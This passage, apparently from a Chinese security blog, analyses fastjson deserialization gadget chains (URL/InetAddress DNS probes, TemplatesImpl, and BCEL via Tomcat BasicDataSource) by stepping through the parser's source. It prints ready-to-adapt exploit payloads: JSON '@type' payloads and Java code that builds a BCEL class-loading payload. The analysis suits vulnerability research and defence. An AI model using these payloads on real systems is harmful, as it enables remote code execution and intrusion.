src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752167049-7b8c7f78-f98d-40dd-96e9-45e54dc3adb7.png#averageHue=%23f9f5f3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=373&id=u70cd5a59&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1050&originWidth=1316&originalType=binary&ratio=1&rotation=0&showTitle=false&size=167125&status=done&style=none&taskId=u598ebc93-c3cc-4ac2-8c31-644fe3778a8&title=&width=467" alt="image.png"><br><code>HashSet.add</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752197691-02b90c9d-2f0a-4794-9739-4ff1e3242bef.png#averageHue=%23eae9d0&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=255&id=u482a3866&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=914&originalType=binary&ratio=1&rotation=0&showTitle=false&size=75038&status=done&style=none&taskId=u1f516c5f-9544-48b2-a535-cfb00e9a863&title=&width=457" alt="image.png"><br><code>HashMap.put</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752211795-651dc0a8-e875-4f2f-985c-eee808b3e705.png#averageHue=%23e8e0c6&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=255&id=ud2457aae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=608&originWidth=2066&originalType=binary&ratio=1&rotation=0&showTitle=false&size=177182&status=done&style=none&taskId=ue9afae23-3381-42ec-ab45-a080a91e84c&title=&width=865" alt="image.png"><br><code>key(java.net.URL对象).hashCode()</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752227138-347d8a5f-227b-4de6-825b-441ab7136101.png#averageHue=%23eaddc3&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=312&id=u2811f769&margin=%5Bobject%20Object%5D&name=image.png&originHeight=624&originWidth=1334&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147910&status=done&style=none&taskId=u67e2cb60-64be-4a85-92a4-fcdfbd1333b&title=&width=667" alt="image.png"><br>这里就执行到<code>java.net.URL.hashCode</code>方法，这样就触发了域名解析；记得不太清楚了，似乎和<code>readObject</code>反序列化中的<code>URLDNS</code>利用链相似<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752368256-74bbd007-71a7-4f5b-8c28-a3e74bff5be9.png#averageHue=%23fafaf8&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=423&id=u4b38f00e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1096&originWidth=1774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181077&status=done&style=none&taskId=u46a2c035-ac1a-4b41-ada8-d4bddbd638d&title=&width=684" alt="image.png"><br>由于整个解析流程，类似于流式结构，因此没有最后一个<code>]</code>闭合<code>Set</code>也是可以的</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>同理，还有两个使用<code>parseArray</code>的解析流程，参照<code> com.alibaba.fastjson.parser.JSONLexerBase#nextToken</code>及<code>scanIdent</code>方法，对应<code>TreeSet</code> 和 []，但是他们对应的是<code>TreeSet</code>和<code>JSONArray</code>；如TreeSet的add方法，会执行<code>Compara</code>方法，需要实现<code>Comparable</code>类，并运行<code>Comparable.compareTo</code>方法，这里想到了<code>readObject CB</code>利用链，暂时放着。<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666752769247-1bc88dac-013e-4488-a091-28d84254f9e1.png#averageHue=%23f8f0ee&clientId=u530b9ee2-d505-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=471&id=uc2ef2003&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1072&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=236263&status=done&style=none&taskId=u325a6b67-d80b-4435-bfb4-380a3e8ce2a&title=&width=598" alt="image.png"></p>
<h4 id="2-1-5-poc构造"><a href="#2-1-5-poc构造" class="headerlink" title="2.1.5 poc构造"></a>2.1.5 poc构造</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetAddress&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet4Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.Inet6Address&quot;</span>,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;</span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.net.InetSocketAddress&quot;</span>&#123;<span class="attr">&quot;address&quot;</span>:,<span class="attr">&quot;val&quot;</span>:<span class="string">&quot;dnslog&quot;</span>&#125;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://dnslog&quot;&#125;]</span><br></pre></td></tr></table></figure>

<h3 id="2-2-TemplatesImpl利用链"><a href="#2-2-TemplatesImpl利用链" class="headerlink" title="2.2 TemplatesImpl利用链"></a>2.2 TemplatesImpl利用链</h3><h4 id="2-2-1-注意私有字段的赋值"><a href="#2-2-1-注意私有字段的赋值" class="headerlink" title="2.2.1 注意私有字段的赋值"></a>2.2.1 注意私有字段的赋值</h4><p>默认通过反射进行复制是不能使用私有字段的，此时需要在反序列化时加上<code>Feature.SupportNonPublicField</code>，因此这种利用链不一定在所有的场景都可以用<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666769390586-628e5e5f-82f7-49b7-b403-0ee40108e2f4.png#averageHue=%23f6f6f5&clientId=u91088b5a-7e13-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=467&id=u1fef1989&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1566&originWidth=2312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=451166&status=done&style=none&taskId=u7ebb3d14-149e-47e3-9c4e-57d764ecffa&title=&width=689" alt="image.png"></p>
<h4 id="2-2-2-数组类型的变量"><a href="#2-2-2-数组类型的变量" class="headerlink" title="2.2.2 数组类型的变量"></a>2.2.2 数组类型的变量</h4><p>当字段值为数组类型时，使用的是<code>ObjectArrayCodec</code>这个类作为反序列化工具类<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773548750-2d8ad966-6b26-4287-b8e4-59ce83b89d77.png#averageHue=%23f4f3ef&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=390&id=ub45859b9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1240&originWidth=2104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=461319&status=done&style=none&taskId=u3f74f68d-4c3c-4095-b6df-909c9aa9b14&title=&width=662" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773590685-71aed2ab-46fa-4ef4-80b5-380bbf76531d.png#averageHue=%23f6f6f1&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=515&id=u81951b27&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1420&originWidth=2562&originalType=binary&ratio=1&rotation=0&showTitle=false&size=538804&status=done&style=none&taskId=u99ac6d72-cf24-4925-b2bd-8af8ca986b1&title=&width=929" alt="image.png"><code>base64解码</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666773618134-41ae335b-7d7c-467c-9b63-23896e5d0682.png#averageHue=%23f6f5f0&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=470&id=ua9892fb2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1510&originWidth=2654&originalType=binary&ratio=1&rotation=0&showTitle=false&size=584282&status=done&style=none&taskId=ue3978a40-270d-424b-be92-a9393c513b3&title=&width=826" alt="image.png"><br>通过序列化去写入一个<code>byte[]</code>字段值也可以看到<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666774215340-3656768c-dd50-43cb-904d-bba9fd92a99f.png#averageHue=%23fbfbfb&clientId=u769790c2-fea5-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=379&id=uc17e5a91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=758&originWidth=1900&originalType=binary&ratio=1&rotation=0&showTitle=false&size=218781&status=done&style=none&taskId=ue4e6c165-9675-4794-ae63-b9f63abc01f&title=&width=950" alt="image.png"><br> 因此，这个poc最大的限制在于，目标在反序列化时，是否配置允许私有字段的属性，即指定<code>Feature.SupportNonPublicField</code> ,如果这项没有指定，那么也就不能使用了；</p>
<h4 id="2-2-3-getOutputProperties"><a href="#2-2-3-getOutputProperties" class="headerlink" title="2.2.3 getOutputProperties"></a>2.2.3 getOutputProperties</h4><p> 这里再提一下，这个poc的触发点，是这个方法；在之前分析fastjson反序列化流程时，对于getXXX方法也是会提取的，前提是getXXX的方法是没有传参的；</p>
<h4 id="2-2-4-结合CB利用链的新思路"><a href="#2-2-4-结合CB利用链的新思路" class="headerlink" title="2.2.4 结合CB利用链的新思路"></a>2.2.4 结合CB利用链的新思路</h4><p>记录一个思路： {“@type”:”org.apache.commons.beanutils.BeanComparator”,”comparator”:{“@type”:”org.apache.commons.collections.comparators.ComparableComparator”},”property”:”outputProperties”}<br>通过<code>TreeSet</code>触发反序列化，这个看看后续能不能用</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;xxxxxxx&quot;</span>],<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;a.b&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123; &#125;,<span class="attr">&quot;_version&quot;</span>:<span class="string">&quot;1.0&quot;</span>,<span class="attr">&quot;allowedProtocols&quot;</span>:<span class="string">&quot;all&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span>,<span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;p&quot;</span>,<span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>这里类加载的部分就不说了，参考之前反序列化中分析<code>TemplatesImpl</code>的步骤，这里触发类的实例化的地方在<code>getOutputProperties()</code></p>
<h3 id="2-3-BCEL利用链"><a href="#2-3-BCEL利用链" class="headerlink" title="2.3 BCEL利用链"></a>2.3 BCEL利用链</h3><h4 id="2-3-1-BasicDataSource关键类"><a href="#2-3-1-BasicDataSource关键类" class="headerlink" title="2.3.1 BasicDataSource关键类"></a>2.3.1 BasicDataSource关键类</h4><p>关键类：<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code><br>如图，在createConnectionFactory方法调用了<code>Class.forName</code>，其中<code>driverClassName</code>和<code>driverClassLoader</code>两个私有参数都有对应的Set方法，因此是可控的<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841736175-aa39e69a-01db-41c1-9e62-6e9dde7459be.png#averageHue=%23faf8f6&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=688&id=ucae1556a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1376&originWidth=2668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=504041&status=done&style=none&taskId=ufa387ade-d668-44b4-9ce5-4c77e2627cc&title=&width=1334" alt="image.png"></p>
</li>
<li><p>追踪一下<code>createConnectionFactory</code> 的调用链   </p>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841994159-4ce07368-b6ca-42e0-81bd-3550765ec97e.png#averageHue=%23f6f6f6&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=112&id=ub0b1a474&margin=%5Bobject%20Object%5D&name=image.png&originHeight=224&originWidth=1184&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29653&status=done&style=none&taskId=u154703f9-f853-4580-88e1-3f8245eba27&title=&width=592" alt="image.png"> <br><strong>此时出现一个问题</strong>：<br>反序列化类的<code>get</code>方法的调用问题，之前的分析流程中<code>getXXX</code>方法会被提取，其中<code>FieldInfo</code>中<code>propertyName</code>是分割<code>getXXX</code>而来，因此不需要必须有对应的字段；<br>但是直接使用<code>JSON.parse(String str)</code>反序列化中，会对getXXX的返回值进行判断，返回类型只能为<code>Collection</code>、<code>Map</code>、<code>AtomicBoolean</code>、<code>AtomicInteger</code>、<code>AtomicLong</code>这几个类型；而<code>BasicDataSource#getConnection</code>的返回类型是<code>Connction</code>，因此不满足使用条件<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666841241851-d5119dbf-e993-4fc8-8eb6-360b57abb017.png#averageHue=%23f9f8f7&clientId=ua4aa9c72-4c8e-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=535&id=u1f36685a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1234&originWidth=1818&originalType=binary&ratio=1&rotation=0&showTitle=false&size=421192&status=done&style=none&taskId=u09f1f10c-599c-4876-a3a8-d0b36ca8549&title=&width=788" alt="image.png"></p>
<h4 id="2-3-2-JSON-parseObject"><a href="#2-3-2-JSON-parseObject" class="headerlink" title="2.3.2 JSON.parseObject()"></a>2.3.2 JSON.parseObject()</h4><p>解决上面问题的办法，也有，网上公开的<br>即在示例代码中将<code>JSON.parse()</code>修改为<code>JSON.parseObject()</code>，此时触发了代码；但是并不能保证目标都是使用<code>parseObject</code>方法去解析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String str = <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;             \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       &#125;,\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;       \&quot;driverClassName\&quot;: \&quot;&quot;</span>+bcel+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">    <span class="string">&quot;      &#125;&quot;</span>;</span><br><span class="line">System.out.println(str);</span><br><span class="line">JSON.parseObject(str);</span><br></pre></td></tr></table></figure>
<h5 id="2-3-2-1-JSON-toJSON-obj"><a href="#2-3-2-1-JSON-toJSON-obj" class="headerlink" title="2.3.2.1 JSON.toJSON(obj)"></a>2.3.2.1 JSON.toJSON(obj)</h5><ol>
<li>调试parseObject，如图，parse是一个正常的反序列化解析，后面返回一个<code>JSON.toJSON(obj);</code></li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666853819155-01c0a031-3ef4-46c3-a554-2ad331ca8d2d.png#averageHue=%23faf4f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=347&id=uf36294e7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=694&originWidth=1048&originalType=binary&ratio=1&rotation=0&showTitle=false&size=130437&status=done&style=none&taskId=u6e3e0351-7aa1-4887-9b19-3fe29a56674&title=&width=524" alt="image.png"></p>
<h5 id="2-3-2-2-createJavaBeanSerializer和createASMSerializer中创建sortedGetters"><a href="#2-3-2-2-createJavaBeanSerializer和createASMSerializer中创建sortedGetters" class="headerlink" title="2.3.2.2 createJavaBeanSerializer和createASMSerializer中创建sortedGetters"></a>2.3.2.2 createJavaBeanSerializer和createASMSerializer中创建sortedGetters</h5><ol start="2">
<li>进入toJSON方法，执行流程 <code>config.getObjectWriter(clazz)</code> -&gt; <code>createJavaBeanSerializer(clazz)</code></li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666853961244-1626e359-9971-4851-afdb-bf8e14434b4f.png#averageHue=%23faf3f2&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=464&id=u02946279&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1312&originWidth=1740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=307612&status=done&style=none&taskId=u528fa4d8-8ca9-4b77-95d3-e6c43622a94&title=&width=615" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854100074-bbf49612-90e7-4bb8-8fc8-183a228554f6.png#averageHue=%23f9f6f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=572&id=ue761ce8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1694&originWidth=1784&originalType=binary&ratio=1&rotation=0&showTitle=false&size=396075&status=done&style=none&taskId=u25591307-34c2-4a30-befa-bb0d1f65102&title=&width=602" alt="image.png"></p>
<ol start="3">
<li>在<code>createJavaBeanSerializer</code> 中关注一下<code>TypeUtils.buildBeanInfo(clazz, null, propertyNamingStrategy);</code>，这里分析这个位置的原因是，从后面的触发点来看，是取的<code>beanInfo</code>中的<code>sortedGetters</code>中的<code>FieldInfo</code>进行操作，因此先看看这些<code>get</code>方法什么时候被取到的</li>
</ol>
<p> <img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854171555-22e7e6c4-0cd9-43fa-a80f-50045df3a2ac.png#averageHue=%23f8f1ef&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=396&id=ufe73af81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=960&originWidth=1892&originalType=binary&ratio=1&rotation=0&showTitle=false&size=290178&status=done&style=none&taskId=u6bf428ea-fa0e-4ee9-9dea-80ca766ddf6&title=&width=780" alt="image.png"></p>
<ol start="4">
<li>可以看到，这里的<code>computeGetters(beanType, jsonType, aliasMap, fieldCacheMap, false, propertyNamingStrategy);</code></li>
</ol>
<p> 不管从方法名上还是调试中，都是和获取<code>get</code>相关方法的<code>FieldInfo</code>相关<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854367136-39c97a7a-fe2d-4360-93ca-29d15070c46c.png#averageHue=%23f9f6f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=641&id=u7ae14e7e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1564&originWidth=1958&originalType=binary&ratio=1&rotation=0&showTitle=false&size=401017&status=done&style=none&taskId=ubba81e46-fd38-47de-8f1a-7f7c37e2d9d&title=&width=803" alt="image.png"></p>
<ol start="5">
<li>如图获取了所有的方法，并对方法名进行判断，其中包括一个条件即<code>getXXX</code>的方法，最终构造一个<code>FieldInfo</code>，存入<code>fieldInfoMap</code>中并遍历到<code>fieldInfoList</code>中返回</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854586165-0deed445-c45b-4617-bea4-9b265bc07bb0.png#averageHue=%23f9f7f5&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=694&id=u3aaa7648&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1714&originWidth=2108&originalType=binary&ratio=1&rotation=0&showTitle=false&size=440507&status=done&style=none&taskId=u17be552e-033f-4372-9b93-6601b6399fd&title=&width=853" alt="image.png"></p>
<ol start="6">
<li>最终<code>buildBeanInfo</code>返回一个<code>SerializeBeanInfo</code>的<code>BeanInfo</code>对象</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666854849360-d8369378-570f-4b10-8276-a1e78c15c527.png#averageHue=%23f8f7f6&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=517&id=u648c416d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1468&originWidth=1884&originalType=binary&ratio=1&rotation=0&showTitle=false&size=332485&status=done&style=none&taskId=u53cff068-d2f2-41f5-beed-43fc180c84f&title=&width=663" alt="image.png"></p>
<ol start="7">
<li>接下来，在<code>createASMSerializer</code>时，判断接口字段信息是否有field为空、方法不为空，且方法不是实现的接口中的方法时，又进入了new JavaBeanSerializer(clazz)中；</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855161299-b3e77726-4d6d-40a7-825e-7b174a1e8dd6.png#averageHue=%23f6f3ef&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=556&id=u694bac0c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1534&originWidth=2192&originalType=binary&ratio=1&rotation=0&showTitle=false&size=538307&status=done&style=none&taskId=ua60edc8d-5267-4ea0-8268-9121e083d8f&title=&width=794" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855069428-90cd50f0-2d3a-4ab0-9938-74c66488daea.png#averageHue=%23f6f4f0&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=508&id=u11fc71e6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1476&originWidth=2298&originalType=binary&ratio=1&rotation=0&showTitle=false&size=610625&status=done&style=none&taskId=u7b7ae460-7325-45f5-bb61-f04db6b7d8e&title=&width=791" alt="image.png"></p>
<ol start="8">
<li>完成实例化<code>JavaBeanSerializer</code>后，返回<code>serializer</code></li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855326621-1e1d218a-92fa-47d6-931d-da823e8e18e4.png#averageHue=%23f7f3f1&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=723&id=u6a9a9165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1676&originWidth=1832&originalType=binary&ratio=1&rotation=0&showTitle=false&size=420418&status=done&style=none&taskId=u06d1b52b-11ec-4e19-b5f9-c84782f220a&title=&width=790" alt="image.png"></p>
<h5 id="2-3-2-3-FieldInfo-get-方法触发invoke执行"><a href="#2-3-2-3-FieldInfo-get-方法触发invoke执行" class="headerlink" title="2.3.2.3 FieldInfo.get()方法触发invoke执行"></a>2.3.2.3 FieldInfo.get()方法触发invoke执行</h5><ol start="9">
<li>一路返回，到第二步，这里将sortedGetters中的FieldInfo，放到Map中，即图中的values</li>
</ol>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855544092-b277870e-aa13-4ba7-816b-f15e46d357eb.png#averageHue=%23f8f5f3&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=608&id=uea4ec959&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1590&originWidth=2084&originalType=binary&ratio=1&rotation=0&showTitle=false&size=377080&status=done&style=none&taskId=u38dcacc8-318a-4674-9f16-1ec9a769ac9&title=&width=797" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title">getFieldValuesMap</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> LinkedHashMap&lt;String, Object&gt;(sortedGetters.length);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (FieldSerializer getter : sortedGetters) &#123;</span><br><span class="line">        map.put(getter.fieldInfo.name, getter.getPropertyValue(object));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855721086-9c71be9d-2bba-4b7f-958c-cd4a78674ef4.png#averageHue=%23f9f6f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=683&id=u014315ea&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1656&originWidth=2024&originalType=binary&ratio=1&rotation=0&showTitle=false&size=405009&status=done&style=none&taskId=u7ec0957a-9055-4e77-81da-dc046fc9ea6&title=&width=835" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855798118-aa6455ae-10be-4f5a-a190-09d058614c74.png#averageHue=%23f8f8f5&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=524&id=ubf9d60c5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1432&originWidth=2306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=387665&status=done&style=none&taskId=u723ced45-e1a5-410f-885a-86e1cdbcde3&title=&width=844" alt="image.png"><br>进入<code>FieldInfo.get</code>方法，这里执行了<code>invoke</code>，触发了<code>getConnection()</code>方法的调用；也就触发了<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource#createConnectionFactory</code>，导致了恶意类加载<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666855834125-e3fdd337-faf2-4393-9bd4-f63ad91e3590.png#averageHue=%23f8f7f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=498&id=uc49448da&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1268&originWidth=2278&originalType=binary&ratio=1&rotation=0&showTitle=false&size=329805&status=done&style=none&taskId=ua9ce33ad-af30-4a4f-bda3-5e075b35e1d&title=&width=894" alt="image.png"></p>
<h4 id="2-3-3-如何使用JSON-parse-触发"><a href="#2-3-3-如何使用JSON-parse-触发" class="headerlink" title="2.3.3 如何使用JSON.parse()触发"></a>2.3.3 如何使用JSON.parse()触发</h4><p><em>实际场景中，目标不一定使用</em><code>_JSON.parseObject(String str)_</code><em>进行解析</em></p>
<h5 id="2-3-3-1-Type为JSONObject类时"><a href="#2-3-3-1-Type为JSONObject类时" class="headerlink" title="2.3.3.1 @Type为JSONObject类时"></a>2.3.3.1 @Type为JSONObject类时</h5><p>如图的解析流程中，当<code>@type</code>类型是<code>JSONObject.class</code>时，会调用<code>key.toString()</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666857860802-07c08ecb-16fa-4469-9fcc-985307b5e64b.png#averageHue=%23f8f8f7&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=852&id=uebd73a9b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=2184&originWidth=2060&originalType=binary&ratio=1&rotation=0&showTitle=false&size=715195&status=done&style=none&taskId=u64fb8721-fcad-43e7-a619-5c475ca5f4b&title=&width=804" alt="image.png"></p>
<h5 id="2-3-3-2-执行到key-toString-方法"><a href="#2-3-3-2-执行到key-toString-方法" class="headerlink" title="2.3.3.2 执行到key.toString()方法"></a>2.3.3.2 执行到key.toString()方法</h5><p>当<code>JSONObject</code>这个类标签解析完成后，执行到<code>key.toString()</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666948632780-ddaa2378-7f04-49ff-8f83-f6ee415d97da.png#averageHue=%23f8f5f4&clientId=u6d26b6aa-6b88-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=583&id=u58fd35d3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1604&originWidth=2496&originalType=binary&ratio=1&rotation=0&showTitle=false&size=447246&status=done&style=none&taskId=u7ae6d8b2-283b-4268-96e9-8b7ed7972a1&title=&width=907" alt="image.png"><br>执行到<code>JSON#toJSONString()</code>方法；进入<code>new JSONSerializer(out).write(this)</code>方法<br><img src="https://cdn.nlark.com/yuque/0/2022/png/1197005/1666858440910-5d09e9c8-abf9-412d-8083-988a101d943f.png#averageHue=%23f7f7f4&clientId=u18b4bf41-3400-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=712&id=u7a67c9ec&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1666&originWidth=2010&originalType=binary&ratio=1&rotation=0&showTitle=false&size=528895&status=done&style=none&taskId=ufae3a256-b8ac-4f5a-9b22-69a2590f916&title=&width=859" alt="image.png"></p>
